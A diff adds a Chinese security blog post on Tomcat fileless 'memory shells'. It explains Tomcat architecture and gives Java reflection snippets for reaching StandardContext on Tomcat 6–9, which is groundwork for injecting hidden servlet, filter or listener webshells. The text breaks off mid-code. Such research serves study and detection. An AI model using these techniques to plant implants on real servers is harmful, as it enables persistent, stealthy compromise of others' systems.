@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="tiehanhan" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      tomcat内存马 
+      
+      
+      |
+    
+     daidaitiehanhan&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar.gif">
+    <link rel="icon" href="/images/avatar.gif">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.gif" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">tiehanhan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">tomcat内存马</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-05-05 23:35:19
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前<del>用各位大师傅们公开的代码调过一些内存马</del>(直接抄大师傅们代码)，但是实战遇到奇葩环境总是出问题，也一直没有系统性地对内存马做过总结，前段时间正好有空决定学习tomcat6–tomcat9下通用的内存马实现并做总结。我测了几种公开的获取standardContext方法，发现仅有ContextClassLoader没法在tomcat6下使用。后面测了servlet,filter,listener下的内存马实现，主要是对tomcat6环境的内存马做了分析，保证内存马尽可能tomcat全版本通用。</p>
+<h2 id="tomcat基础知识"><a href="#tomcat基础知识" class="headerlink" title="tomcat基础知识"></a>tomcat基础知识</h2><p>参考<a target="_blank" rel="noopener" href="https://pdai.tech/md/framework/tomcat/tomcat-x-arch.html">理解Tomcat架构设计</a></p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220504004959131.png" alt="image-20220504004959131"></p>
+<ul>
+<li><strong>Server</strong>: 表示服务器，它提供了一种优雅的方式来启动和停止整个系统，不必单独启停连接器和容器；它是Tomcat构成的顶级构成元素，所有一切均包含在Server中；</li>
+<li><strong>Service</strong>: 表示服务，Server可以运行多个服务。比如一个Tomcat里面可运行订单服务、支付服务、用户服务等等；Server的实现类StandardServer可以包含一个到多个Services，Service的实现类为StandardService调用了容器(Container)接口，其实是调用了Servlet Engine(引擎)，而且StandardService类中也指明了该Service归属的Server;</li>
+<li><strong>Container</strong>: 表示容器，可以看做Servlet容器，按照包含关系依次有：引擎(Engine)容器、主机(Host)容器、上下文(Context)容器和Wraper容器。在 Tomcat 中，每个 Host 下可以有多个 Context （Context 是 Host 的子容器）， 每个 Context 都代表一个具体的Web应用，都有一个唯一的路径就比如tomcat默认的&#x2F;manager这种，在一个 Context 下可以有着多个 Wrapper。Wrapper 主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收。<ul>
+<li>Engine – 引擎</li>
+<li>Host – 主机</li>
+<li>Context – 上下文</li>
+<li>Wrapper – 包装器</li>
+</ul>
+</li>
+<li><strong>Connector</strong>: 表示连接器, <strong>它将Service和Container连接起来</strong>，首先它需要注册到一个Service，它的作用就是把来自客户端的请求转发到Container(容器)，这就是它为什么称作连接器, 它支持的协议如下：<ul>
+<li>支持AJP协议</li>
+<li>支持Http协议</li>
+<li>支持Https协议</li>
+</ul>
+</li>
+<li><strong>Service内部</strong>还有各种支撑组件，下面简单罗列一下这些组件<ul>
+<li>Manager – 管理器，用于管理会话Session</li>
+<li>Logger – 日志器，用于管理日志</li>
+<li>Loader – 加载器，和类加载有关，只会开放给Context所使用</li>
+<li>Pipeline – 管道组件，配合Valve实现过滤器功能</li>
+<li>Valve – 阀门组件，配合Pipeline实现过滤器功能</li>
+<li>Realm – 认证授权组件</li>
+</ul>
+</li>
+</ul>
+<p>例如网上教程中的一个案例，假设来自客户的请求为：<a target="_blank" rel="noopener" href="http://localhost:8080/test/index.jsp">http://localhost:8080/test/index.jsp</a> 请求被发送到本机端口8080，被在那里侦听的Coyote HTTP&#x2F;1.1 Connector捕获，然后</p>
+<ul>
+<li>Connector把该请求交给它所在的Service的Engine来处理，并等待Engine的回应</li>
+<li>Engine获得请求localhost:8080&#x2F;test&#x2F;index.jsp，匹配它所有虚拟主机Host</li>
+<li>Engine匹配到名为localhost的Host(即使匹配不到也把请求交给该Host处理，因为该Host被定义为该Engine的默认主机)</li>
+<li>localhost Host获得请求&#x2F;test&#x2F;index.jsp，匹配它所拥有的所有Context</li>
+<li>Host匹配到路径为&#x2F;test的Context(如果匹配不到就把该请求交给路径名为””的Context去处理)</li>
+<li>path&#x3D;”&#x2F;test”的Context获得请求&#x2F;index.jsp，在它的mapping table中寻找对应的servlet</li>
+<li>Context匹配到URL PATTERN为*.jsp的servlet，对应于JspServlet类，构造HttpServletRequest对象和HttpServletResponse对象，作为参数调用JspServlet的doGet或doPost方法</li>
+<li>Context把执行完了之后的HttpServletResponse对象返回给Host</li>
+<li>Host把HttpServletResponse对象返回给Engine</li>
+<li>Engine把HttpServletResponse对象返回给Connector</li>
+<li>Connector把HttpServletResponse对象返回给客户browser</li>
+</ul>
+<h2 id="获取standardContext"><a href="#获取standardContext" class="headerlink" title="获取standardContext"></a>获取standardContext</h2><p>实现tomcat的servlet,filter,listener等常规内存马都绕不开获取standardContext，所以一种通用的standadContext获取思路尤为重要。下面对网上公开的几种获取standardContext的常见思路做研究，不管是用于内存马构建还是中间件回显都可以做参考。其中当不能直接拿request对象时，只有ThreadLocal，Mbean，线程这三种方法可以全版本拿到standardContext，整体来说个人更推荐使用基于线程获取standardContext。</p>
+<h3 id="使用request对象"><a href="#使用request对象" class="headerlink" title="使用request对象"></a>使用request对象</h3><p>利用request对象可以获取<code>servletContext</code>，再利用<code>servletContext</code>可以一步一步获取<code>standardContext</code></p>
+<h4 id="直接能拿到request对象的场景"><a href="#直接能拿到request对象的场景" class="headerlink" title="直接能拿到request对象的场景"></a>直接能拿到request对象的场景</h4><p>例如直接在jsp文件中，可以直接拿到request对象</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318160133692.png" alt="image-20220318160133692"></p>
+<p>代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.<span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">actx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">actx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) actx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">sctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">sctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) sctx.get(applicationContext); </span><br></pre></td></tr></table></figure>
+
+<h4 id="利用ContextClassLoader获取request"><a href="#利用ContextClassLoader获取request" class="headerlink" title="利用ContextClassLoader获取request"></a>利用ContextClassLoader获取request</h4><p>参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">Litch1师傅文章</a></p>
+<p>适用于tomcat8.x–9.x</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318160342897.png" alt="image-20220318160342897"></p>
+<p>代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardRoot</span> <span class="variable">standardroot</span> <span class="operator">=</span> (StandardRoot) webappClassLoaderBase.getResources();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardroot.getContext();</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用ThreadLocal获取request"><a href="#利用ThreadLocal获取request" class="headerlink" title="利用ThreadLocal获取request"></a>利用ThreadLocal获取request</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7348">kingkk师傅</a>和<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388">threedr3am师傅</a>的思路，在类<code>catalina.jar!/org/apache/catalina/core/ApplicationFilterChain.class</code>有两个<code>threadLocal</code>变量</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220321113348625.png" alt="image-20220321113348625"></p>
+<p>且在<code>internalDoFilter</code>方法存在赋值的操作把当前request和response存入<code>threadLocal</code>变量</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220321113444128.png" alt="image-20220321113444128"></p>
+<p>只要**反射修改<code>org.apache.catalina.core.ApplicationDispatcher.WRAP_SAME_OBJECT</code>值为true并且实例化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>**就能把request存入threadLocal中(tomcat6则修改<code>org.apache.catalina.Globals.STRICT_SERVLET_COMPLIANCE</code>为true)</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220321114455515.png" alt="image-20220321114455515"></p>
+<p>美中不足的是<code>internalDoFilter</code>方法先执行完所有filter才走到threadLocal变量的赋值过程，因此如果是shiro反序列化这种自带filter处理的漏洞这种方法拿不到回显需要的request。</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220321113802790.png" alt="image-20220321113802790"></p>
+<p>代码(适用于tomcat6.x–9.x)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrap_same_object</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        wrap_same_object = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        <span class="comment">//tomcat6 修改STRICT_SERVLET_COMPLIANCE变量</span></span><br><span class="line">        wrap_same_object = Class.forName(<span class="string">&quot;org.apache.catalina.Globals&quot;</span>).getDeclaredField(<span class="string">&quot;STRICT_SERVLET_COMPLIANCE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">    lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    wrap_same_object.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//修改final属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">    modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">wrap_same_object1</span> <span class="operator">=</span> wrap_same_object.getBoolean(<span class="literal">null</span>);</span><br><span class="line">    ThreadLocal&lt;ServletRequest&gt; requestThreadLocal = (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">    ThreadLocal&lt;ServletResponse&gt; responseThreadLocal = (ThreadLocal&lt;ServletResponse&gt;)lastServicedResponse.get(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (!wrap_same_object1 &amp;&amp; requestThreadLocal == <span class="literal">null</span> &amp;&amp; responseThreadLocal == <span class="literal">null</span>)&#123; <span class="comment">//第一次请求时反射注册request和response到threadLocal中</span></span><br><span class="line">        wrap_same_object.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">        lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">        lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;   <span class="comment">//从threadLocal中取出response证明</span></span><br><span class="line">        <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> responseThreadLocal.get();</span><br><span class="line">        servletResponse.getWriter().write(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用MBean"><a href="#利用MBean" class="headerlink" title="利用MBean"></a>利用MBean</h4><p>早期如果<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7535?page=5">跟过tomcat回显</a>应该对<code>MBeanServer</code>有点印象，<code>RequestInfo</code>在<code>AbstractProtocol</code>类有两个去向</p>
+<ol>
+<li>注册到global中</li>
+<li>被注册到了MBeanServer中</li>
+</ol>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220321152034954.png" alt="image-20220321152034954"></p>
+<p>其实<code>MBeanServer</code>中除了有request，还能直接拿到<code>StandardContext</code>，参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g">文章</a></p>
+<p>在<code>domainTb</code>这个HashMap中存储有大量对象，里面很多HashMap都符合我们的要求</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220321152726663.png" alt="image-20220321152726663"></p>
+<p>这里我用的是<code>BasicAuthenticator</code>，因为我发现每个tomcat版本都有这个。</p>
+<p>发现师傅们使用<code>MbeanServer</code>取StandardContext的公开写法很多都是用直接<code>HashMap</code>中具体的key值去取，这样取值兼容性肯定会受到影响，比如<code>BasicAuthenticator</code>这个NameObject在tomcat6的key值是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=localhost,name=BasicAuthenticator,path=/manager,type=Valve</span><br></pre></td></tr></table></figure>
+
+<p>而tomcat7的key值是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context=/manager,host=localhost,name=BasicAuthenticator,type=Valve</span><br></pre></td></tr></table></figure>
+
+<p>这样不同版本误差是比较大的，而且有点坑的是需要猜host名和webapp名，显然不太适合实战使用。</p>
+<p>我这里想的是其实可以直接遍历所有的HashMap，取出其中key值中有我们需要的BasicAuthenticator关键字的NameObject，测了一下，在tomcat6.x–9.x都测试通过能正常拿到context</p>
+<p>最终代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MBeanServer</span> <span class="variable">mBeanServer</span> <span class="operator">=</span> Registry.getRegistry(<span class="literal">null</span>, <span class="literal">null</span>).getMBeanServer();</span><br><span class="line">    <span class="comment">// 获取mbsInterceptor</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">mbsInterceptor</span> <span class="operator">=</span> field.get(mBeanServer);</span><br><span class="line">    <span class="comment">// 获取repository</span></span><br><span class="line">    field = Class.forName(<span class="string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">repository</span> <span class="operator">=</span> field.get(mbsInterceptor);</span><br><span class="line">    <span class="comment">// 获取domainTb</span></span><br><span class="line">    field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    HashMap&lt;String, Map&gt; domainTb = (HashMap&lt;String,Map&gt;)field.get(repository);</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">aaa</span> <span class="operator">=</span> (HashMap) domainTb.get(<span class="string">&quot;Catalina&quot;</span>);</span><br><span class="line">    Iterator &lt;Map.Entry&lt; String, String &gt;&gt; iterator = aaa.entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">        Map.Entry&lt; String, String &gt; entry = iterator.next();</span><br><span class="line">      <span class="comment">//遍历所有HashMap，取出符合条件的HashMap从中取StandardContext</span></span><br><span class="line">        <span class="keyword">if</span>(entry.getKey().toString().contains(<span class="string">&quot;BasicAuthenticator&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">// 获取domain</span></span><br><span class="line">            <span class="type">NamedObject</span> <span class="variable">nonLoginAuthenticator</span> <span class="operator">=</span> (NamedObject) domainTb.get(<span class="string">&quot;Catalina&quot;</span>).get(entry.getKey());</span><br><span class="line">            field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span>).getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> field.get(nonLoginAuthenticator);</span><br><span class="line">            <span class="comment">// 获取resource</span></span><br><span class="line">            field = Class.forName(<span class="string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span>).getDeclaredField(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">resource</span> <span class="operator">=</span> field.get(object);</span><br><span class="line">            <span class="comment">// 获取context</span></span><br><span class="line">            field = Class.forName(<span class="string">&quot;org.apache.catalina.authenticator.AuthenticatorBase&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) field.get(resource);</span><br><span class="line">            out.println(standardContext);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用线程"><a href="#利用线程" class="headerlink" title="利用线程"></a>利用线程</h4><p>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">bitterz师傅文章</a>提到，<a target="_blank" rel="noopener" href="https://blog.xray.cool/post/how-to-find-shiro-rememberme-deserialization-vulnerability/">xray社区这篇文章</a>通过使用<strong>Thread.currentThread().getThreadGroup()<strong>得到的线程数组拿到了request和response对象，实现了tomcat全版本的回显，基于这一启发，bitterz师傅尝试用线程数组中的request对象获取context，却发现我们拿到的request对象是</strong>org.apache.coyote.Request</strong>，这个Request类根本没有<code>servletContext</code>属性，也没有其他获取context的方法。</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220317174708125.png" alt="image-20220317174708125"></p>
+<h5 id="线程-StandardEngine"><a href="#线程-StandardEngine" class="headerlink" title="线程+StandardEngine"></a>线程+StandardEngine</h5><p>bitterz师傅发现线程数组中有一个叫<code>StandardEngine</code>的线程，也可以拿到<code>StandardContext</code></p>
+<blockquote>
+<p>在Tomcat里，一个Engine可以配置多个虚拟主机，也就是Host，每个Host有一个域名。一个Host下面又可以配置多个webapp，也就是tomcat&#x2F;webapps目录下的多个webapp，而每个webapp可以表示为一个StandardContext，用来控制这个webapp。当然，一个Host可以就可以有多个StandardContext</p>
+</blockquote>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318154341103.png" alt="image-20220318154341103"></p>
+<p>只要我们拿到host的名字和webapp的名字就可以拿到StandardContext，碰巧我们前面获取的Request对象就可以辅助拿到这些值。</p>
+<p>具体代码可以直接看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914#toc-7">这里</a></p>
+<h5 id="线程-Acceptor"><a href="#线程-Acceptor" class="headerlink" title="线程+Acceptor"></a>线程+Acceptor</h5><p>tomcat 9.x默认没有<code>StandardEngine</code>线程，前面线程+StandardEngine的方法不够通用，后面bitterz师傅又发现Acceptor线程可以利用</p>
+<blockquote>
+<p>在线程数组中继续寻找，发现每个Tomcat版本下，都会开一个Http-xio-端口-Acceptor的线程，Acceptor是用来接收请求的，这些请求自然会交给后面的Engine-&gt;Host-&gt;Context-&gt;servlet</p>
+</blockquote>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318155446741.png" alt="image-20220318155446741"></p>
+<p>可以看到一样可以拿到StandardContext,<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914#toc-8">代码戳这</a></p>
+<h5 id="Acceptor线程"><a href="#Acceptor线程" class="headerlink" title="Acceptor线程"></a>Acceptor线程</h5><p>观察Acceptor线程可以发现，这个线程也可以直接拿到一个<strong>org.apache.coyote.Request</strong>对象</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318142922422.png" alt="image-20220318142922422"></p>
+<p>如果是tomcat9.x，则把this$0换成endpoint</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318143109679.png" alt="image-20220318143109679"></p>
+<p>仔细查看这个Request类的notes属性可以发现里面存储有一个Request对象</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318113842624.png" alt="image-20220318113842624"></p>
+<p>看这个Request对象的属性可以发现有context属性，直接就可以拿到StandardContext对象</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318114050739.png" alt="image-20220318114050739"></p>
+<p>这里note对象里存储的request对象是<strong>org.apache.catalina.connector.Request</strong>，直接从context属性获取StandardContext适用于tomcat6.x–8.x，在tomcat9中这个Request类没有context属性，但是我们可以<strong>使用getContext()方法获取StandardContext</strong>，使用getContext()这种方式适用于tomcat全版本。</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318141334035.png" alt="image-20220318141334035"></p>
+<p>同时还可以发现，在tomcat7.x–9.x也可以先用**getServletContext()**方法拿到ServletContext对象，然后利用ServletContext获取StandardContext对象</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220318114541803.png" alt="image-20220318114541803"></p>
+<p>综上可知，可以直接使用Http-xio-端口-Acceptor这个线程中的request对象通过一系列取值拿到Tomcat全版本的StandardContext对象，代码如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 